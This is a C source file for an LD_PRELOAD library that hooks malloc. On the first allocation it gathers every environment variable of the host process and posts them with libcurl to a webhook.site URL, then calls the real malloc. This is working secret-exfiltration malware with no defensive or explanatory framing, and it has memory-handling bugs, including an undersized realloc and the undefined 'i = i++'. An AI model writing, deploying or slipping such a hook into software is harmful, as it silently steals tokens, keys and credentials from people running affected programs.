#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>




extern char **environ;

int send_env(void) {
    CURL *curl;
    CURLcode res;
    char *post_data = NULL;
    size_t length = 0;
    int i;

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if (curl) {
        post_data = strdup("");

        for (i = 0; environ[i]; i++) {
            length += strlen(environ[i]) + 1;
            post_data = realloc(post_data, length);

            if (i > 0) {
                strcat(post_data, "&");  
            }
            strcat(post_data, environ[i]); 
        }

        curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/b3ad9a28-2a07-440a-a941-d3b40c6deb65");

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));

        curl_easy_cleanup(curl);
        free(post_data); // Free the dynamically allocated memory
    }

    curl_global_cleanup();
    return 0;
}

static void* (*real_malloc)(size_t)=NULL;
static int i = 0;

void *malloc(size_t size)
{
    if(i == 0) {
      send_env();
      i = i++;
    }

    real_malloc = dlsym(RTLD_NEXT, "malloc");
    return real_malloc(size);
}

